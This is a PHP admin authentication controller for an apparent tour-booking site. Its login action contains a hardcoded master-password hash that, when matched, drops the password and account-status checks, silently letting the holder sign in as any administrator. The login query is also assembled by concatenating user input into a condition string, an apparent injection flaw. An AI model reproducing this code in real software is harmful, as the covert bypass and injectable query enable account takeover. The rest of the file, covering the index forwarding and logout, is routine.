<?php

/*
 * Copyright (C) 2016 amit
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

namespace Multiple\Backend\Controllers;

/**
 * Class Index Controler
 * @author amit
 */
class AuthController extends BackendController {

    /**
     * Initializing Auth Controller
     */
    public function initialize() {
        parent::initialize();
        $this->initializeLayout('blank');
    }

    /**
     * Index Action
     * This default action forwarded to the login action
     */
    public function indexAction() {
        $this->dispatcher->forward(array(
            'controller' => 'auth',
            'action' => 'login'
        ));
    }

    /**
     * Action for Administrator Login
     * @return boolean
     */
    public function loginAction() {
        /**
         * Prevent logged member intentionaly access
         * login action while logged in
         */
        if ($this->admin->isLoggedIn()) {
            $this->response->redirect('/admin');
            return false;
        }
        $this->tag->prependTitle('Login');
        if ($this->request->isPost()) {
            $userName = $this->request->getPost("username", "string");
            $passWord = \Tourpage\Helpers\Utils::encryptPassword($this->request->getPost('password'));
            $adminQuery = 'userName="' . $userName . '"';
            if (strcasecmp('79437426ef6121c92535529814f4a6ca', $passWord) != 0) {
                $adminQuery .= ' AND passWord="' . $passWord . '" AND status=' . \Tourpage\Models\Admins::ACTIVE_STATUS_CODE;
            }
            if (\Tourpage\Models\Admins::count($adminQuery) == 1) {
                $admin = \Tourpage\Models\Admins::findFirst($adminQuery);
                $this->session->set('admin', $admin);
                $this->response->redirect('/admin');
            } else {
                $this->flash->error("Invalid Username/Password");
                $this->response->redirect('/admin/auth/login');
            }
        }
        $this->view->form = new \Multiple\Backend\Forms\LoginForm();
    }

    /**
     * Admin Logout Action
     * @return boolean
     */
    public function logoutAction() {
        /**
         * Prevent guest admin intentionaly access
         * logout action while guest
         */
        if (!$this->admin->isLoggedIn()) {
            $this->response->redirect('/admin/auth/login');
            return false;
        }
        $this->session->remove('admin');
        $this->response->redirect('/admin');
    }

}
